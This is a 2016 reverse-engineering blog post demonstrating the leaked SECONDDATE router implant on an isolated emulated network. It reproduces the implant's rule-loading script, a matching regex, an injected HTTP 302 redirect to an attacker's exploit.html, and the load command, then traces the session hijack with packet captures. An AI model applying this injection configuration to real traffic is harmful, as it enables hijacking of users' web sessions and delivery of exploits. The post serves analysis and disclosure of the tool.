<!DOCTYPE html>
<html>
  <head>
    <title>SECONDDATE in action – Laanwj's blog – —</title>

        <meta charset="utf-8" />
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>

    
    <meta name="description" content="Here I’ve taken the environment from the BLATSTING Command-and-Control protocol article and extended it, so that the emulator works as a router
between an internal network with our victim and an external network, a mock version of the internet with just our
attacker and one web server:

" />
    <meta property="og:description" content="Here I’ve taken the environment from the BLATSTING Command-and-Control protocol article and extended it, so that the emulator works as a router
between an internal network with our victim and an external network, a mock version of the internet with just our
attacker and one web server:

" />
    
    <meta name="author" content="Laanwj's blog" />

    
    <meta property="og:title" content="SECONDDATE in action" />
    <meta property="twitter:title" content="SECONDDATE in action" />
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="alternate" type="application/rss+xml" title="Laanwj's blog - —" href="/feed.xml" />

    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          <a href="/" class="site-avatar"><img src="/atari_st_bee.png" /></a>

          <div class="site-info">
            <h1 class="site-name"><a href="/">Laanwj's blog</a></h1>
            <p class="site-description">—</p>
          </div>

          <nav>
            <a href="/">Blog</a>
            <a href="/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>SECONDDATE in action</h1>

  <div class="entry">
    <p>Here I’ve taken the environment from the <a href="/2016/09/04/blatsting-command-and-control.html">BLATSTING Command-and-Control protocol</a> article and extended it, so that the emulator works as a router
between an internal network with our victim and an external network, a mock version of the internet with just our
attacker and one web server:</p>

<pre>
SimInternet, level 2

                      ╔════════════════════════════╗
                      ║ BLATSTING emulator         ║
╔════════════════╗    ║ ╔════════════════════════╗ ║    ╔════════════════╗  emulated
║ Victim host    ║    ║ ║  Emulated modules      ║ ║    ║ Attacker host  ║  serial
║                ║    ║ ║ ┌─────────┐ ┌────────┐ ║ ║    ║ ┌─────┐┌─────┐ ║  (control)
║ ┌─────────┐    ║    ║ ║ │ second  ◀┄▶ hash   │ ║ ║    ║ │httpd││SD LP│◀━━━━━━━━  
║ │ Browser │    ║    ║ ║ │ date    │ └────────┘ ║ ║    ║ └─────┘└─────┘ ║
║ └─────────┘    ║    ║ ║ │         │ ┌────────┐ ║ ║    ║      ↕         ║
║      ↕         ║    ║ ║ │         ◀┄▶ crypto │ ║ ║    ║ Linux nw. stck ║
║ Linux nw. stck ║    ║ ║ └─────────┘ └────────┘ ║ ║    ╚══════▲═════════╝
╚══════▲═════════╝    ║ ╚════▲════▲══════════════╝ ║           ┃   ╔══════════════════╗
       ┃              ║ ┌────▼──┐ ┆                ║           ┣━━━▶ Web server ACME  ║
       ┃              ║ │ [stub]│ ┆                ║ "outside" ┃   ║ Int. Widgits Ltd ║
       ┃     "inside" ║ │ core  │┌▼───────┐ Emu.nw.║ eth1      ┃   ╚══════════════════╝
       ┃         eth2 ║ └───────┘│ [stub] ◀┄┄┄┄┄┄┄┄▶◀━━━━━━━━━━┛
       ┗━━━━━━━━━━━━━▶◀┄┄┄┄┄┄┄┄┄┄▶ network│ Stck   ║  Eth-over-UDP 
                      ║          └────────┘        ║               
                      ╚════════════════════════════╝
</pre>

<p>This will allow using SECONDDATE as it was intended to be used, to redirect website visitors (but only on the isolated
virtual network). The attacker runs a web server to redirect the victim to, which serves exploit payloads (a FOXACID
server, in Equation Group jargon).</p>

<p><em>(this showed a terminal session from showterm.io, but the content is no longer available)</em></p>

<h3 id="setup-attacker">Setup: Attacker</h3>

<p>We’ll (as the attacker) set up the implant with this LP script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>disable 1
rule 1 <span class="nt">--protocol</span> 6 <span class="nt">--dstport</span> 80 <span class="nt">--nocheckhttp</span> <span class="nt">--checkregex</span> <span class="nt">--inject</span> <span class="nt">--injectfile</span> injectfile_tcp <span class="nt">--regexfile</span> regex_tcp
<span class="nb">enable </span>1
</code></pre></div></div>

<p class="center"><em>tcptest.seconddate: configuration script for setting up SECONDDATE.</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule <span class="o">[</span>rulenum] <span class="o">[</span>opts ...]           Sets options <span class="k">for </span>a rule.
                                      where opts is one or more of the following options
                                     <span class="o">(</span>defaults are shown <span class="k">in </span>parentheses<span class="o">)</span>:
                                     <span class="o">[</span><span class="nt">--srcaddr</span> addr<span class="o">(</span>0<span class="o">)]</span> <span class="o">[</span><span class="nt">--srcmask</span> mask<span class="o">(</span>0<span class="o">)]</span>
                                     <span class="o">[</span><span class="nt">--dstaddr</span> addr<span class="o">(</span>0<span class="o">)]</span> <span class="o">[</span><span class="nt">--dstmask</span> mask<span class="o">(</span>0<span class="o">)]</span>
                                     <span class="o">[</span><span class="nt">--protocol</span> prot<span class="o">(</span>6/TCP<span class="o">)]</span> <span class="o">[</span><span class="nt">--srcport</span> port<span class="o">(</span>0<span class="o">)]</span> <span class="o">[</span><span class="nt">--dstport</span> port<span class="o">(</span>0<span class="o">)]</span>
                                     <span class="o">[</span><span class="nt">--mininterval</span><span class="o">(</span>60<span class="o">)]</span> <span class="o">[</span><span class="nt">--maxinjections</span><span class="o">(</span>5<span class="o">)]</span> <span class="o">[</span><span class="nt">--injectwindow</span><span class="o">(</span>0<span class="o">)]</span>
                                     <span class="o">[</span><span class="nt">--checkhttp</span> <span class="o">(</span>default<span class="o">)</span> | <span class="nt">--nocheckhttp</span><span class="o">]</span>
                                     <span class="o">[</span><span class="nt">--checkregex</span> <span class="o">(</span>default<span class="o">)</span> | <span class="nt">--nocheckregex</span><span class="o">]</span>
                                         <span class="o">[</span><span class="nt">--inject</span> <span class="o">(</span>default<span class="o">)</span> | <span class="nt">--noinject</span>
                                     <span class="o">[</span><span class="nt">--tcpflag</span> <span class="o">(</span>FIN ACK PSH<span class="o">)</span> URG | ACK | PSH | RST | SYN | FIN <span class="o">]</span>
                                     <span class="o">[</span><span class="nt">--regexfile</span> &lt;filename&gt;] <span class="o">[</span><span class="nt">--injectfile</span> &lt;filename&gt;
</code></pre></div></div>

<p class="center"><em>SD rule definitions, from SecondDateLp <code class="language-plaintext highlighter-rouge">help</code>.</em></p>

<p>The script does the following:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">disable 1</code>: Disable any previous rule 1 (this allows for quick reloading, as live rules cannot be re-configured).</li>
  <li><code class="language-plaintext highlighter-rouge">rule 1 ...</code>: Set up rule 1.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">--protocol 6</code>: Match IP protocol 6, <a href="https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers">which happens to be
TCP</a>. Only TCP or UDP allowed here.</li>
      <li><code class="language-plaintext highlighter-rouge">--dstport 80</code>: Destination port 80, HTTP.</li>
      <li><code class="language-plaintext highlighter-rouge">--nocheckhttp</code>: Don’t use the built-in regexp for HTTP, that’s no fun. Define our own.</li>
      <li><code class="language-plaintext highlighter-rouge">--checkregex</code>: Check for regex defined in <code class="language-plaintext highlighter-rouge">--regexfile</code> below.</li>
      <li><code class="language-plaintext highlighter-rouge">--inject</code>: Do packet injections.</li>
      <li><code class="language-plaintext highlighter-rouge">--injectfile injectfile_tcp</code>: Set data to inject on injection.</li>
      <li><code class="language-plaintext highlighter-rouge">--regexfile regex_tcp</code>: Set regexp to match.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">enable 1</code>: Make rule 1 live.</li>
</ul>

<p>It is possible to fine-tune various parameters such as the maximum number of injections, the time within which this has
to happen, the time between injections and so on and so on, but the defaults work fine for sake of this demo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>^GET / .<span class="k">*</span>
</code></pre></div></div>

<p class="center"><em><code class="language-plaintext highlighter-rouge">regex_tcp</code>: The regular expression to match on TCP packets. This looks for HTTP GET requests to the root, any version.
This can be any valid <a href="https://www.debuggex.com/cheatsheet/regex/pcre">PCRE</a> regular expression.</em></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
Location: http://192.168.1.1/exploit.html

grazing buzzards
</code></pre></div></div>

<p class="center"><em><code class="language-plaintext highlighter-rouge">injectfile_tcp</code>: This will be injected into the TCP session. A basic HTTP temporary redirect to the evil web server.
<code class="language-plaintext highlighter-rouge">grazing buzzards</code> is just a 16-byte string that I use for finding the packet in captures.</em></p>

<p>Then subsequently load it into the implant by invoking the LP command from the shell and piping in the script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./SecondDate-3.1.1.0.SecondDateLp 192.168.1.2 &lt; tcptest.seconddate
</code></pre></div></div>

<p class="center"><em>Loading the rules, from LP-side serial console.</em></p>

<h3 id="setup-victim">Setup: Victim</h3>

<p>The victim is simply using a PC running a browser and is trying to visit a website over HTTP. Luckily with <a href="https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS
preloading</a> the latter is happening less and less in
practice. For the sake of being able to record the terminal session they are using the venerable browser <code class="language-plaintext highlighter-rouge">lynx</code>,
but this will work with any browser.</p>

<h3 id="the-attack">The attack</h3>

<p>The victim, from IPv4 address <code class="language-plaintext highlighter-rouge">192.168.2.1</code>, is trying to visit the legitimate web server of ACME Internet Widgits Ltd.
at <code class="language-plaintext highlighter-rouge">192.168.1.100</code>, through their router (Internet IP <code class="language-plaintext highlighter-rouge">192.168.1.2</code>). They will be redirected to the attacker’s host,
<code class="language-plaintext highlighter-rouge">192.168.1.1</code>, which hosts an exploit page. To recap:</p>

<pre>
                                                           ╔══════════╗
╔════════════════╗                                         ║ Attacker ║
║ Victim host    ║                                         ╚════▲═════╝
║                ║                  ╔═════════════╗             ┃ 192.168.1.1
║ ┌─────────┐    ║ 192.168.2.1      ║ Compromised ║             ┃  
║ │ Browser │    ◀━━━━━━━━━━━━━━━━━━▶ Router      ◀━━━━━━━━━━━━━┫
║ └─────────┘    ║      192.168.2.2 ╚═════════════╝ 192.168.1.2 ┃
║                ║                                              ┃ 192.168.1.100
║                ║                                 ╔════════════▼═════╗
╚════════════════╝                                 ║ Web server ACME  ║
                                                   ║ Int. Widgits Ltd ║
                                                   ╚══════════════════╝
</pre>

<p>What happens:</p>

<ul>
  <li>Victim opens <code class="language-plaintext highlighter-rouge">http://192.168.1.100/</code> in their browser, which opens a connection to the web server of
ACME Int. Widgits Ltd.</li>
</ul>

<p class="center"><img src="/assets/2016/09/23/seconddate-adventures/acme.png" alt="ACME Internet Widgits Ltd" title="ACME Internet Widgits Ltd" /></p>

<p><em>The website of ACME Internet Widgits Ltd., which has a world-wide monopoly on delivering Schrödinger’s boxes by drone. Cat not included.</em></p>

<ul>
  <li>SD, running on the compromised router, triggers on the first content packet of this connection, eats it, and instead injects a packet to redirect
to the attacker’s server, then immediately closes the connection. It resets the connection to the original web server with a TCP RST packet.</li>
</ul>

<p class="center"><a href="/assets/2016/09/23/seconddate-adventures/injection.png"><img src="/assets/2016/09/23/seconddate-adventures/injection.png" alt="Injected packet in wireshark" title="Injected packet in wireshark" /></a></p>

<p><em>Injected packet as seen from the inside network. The RSTs going to both the webserver and client to immediately
end the connection afterward are also visible. The full captures can be downloaded below.</em></p>

<ul>
  <li>Victim is redirected to <code class="language-plaintext highlighter-rouge">http://192.168.1.100/exploit.html</code>, and will load whatever is on that page.</li>
</ul>

<p class="center"><img src="/assets/2016/09/23/seconddate-adventures/exploit.png" alt="Lazy exploit" title="Lazy exploit" /></p>

<p><em>The ultimate lazy exploit, just for illustration. Not only does the victim have to adjust their CPU’s
instruction pointer manually, they’d have to first finish writing the shellcode. The Equation Group has better ones
available. The target link would in practice point to a browser exploit (usually aimed at a plugin such as Flash), or a
backdoored installer when intercepting a download.</em></p>

<ul>
  <li>Note that when the victim immediately loads the site again they won’t get redirected again. The <code class="language-plaintext highlighter-rouge">mininterval</code> serves
as a cool-down period.</li>
</ul>

<p>Packet captures:</p>

<ul>
  <li><a href="/assets/2016/09/23/seconddate-adventures/seconddate_int.cap">seconddate_int.cap</a> internal network</li>
  <li><a href="/assets/2016/09/23/seconddate-adventures/seconddate_ext.cap">seconddate_ext.cap</a> external network (includes <a href="/2016/09/17/seconddate-cnc.html">C&amp;C</a>
traffic)</li>
</ul>


  </div>

  <div class="date">
    Written on September 23, 2016
  </div>
  <div class="tags">
    Tags: 
    
    
      <a href="/tags/#eqgrp" class="post-tag">eqgrp</a>
    
      <a href="/tags/#malware" class="post-tag">malware</a>
    
    
  </div>
  <div class="categories">
    Filed under
    
    
      <a href="/categories/#reverse-engineering" class="post-category">Reverse-engineering</a>
    
    
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/laanwj/laanwj.github.io"><i class="svg-icon github"></i></a>



<a href="/feed.xml"><i class="svg-icon rss"></i></a>




        </footer>
      </div>
    </div>

    

  </body>
</html>
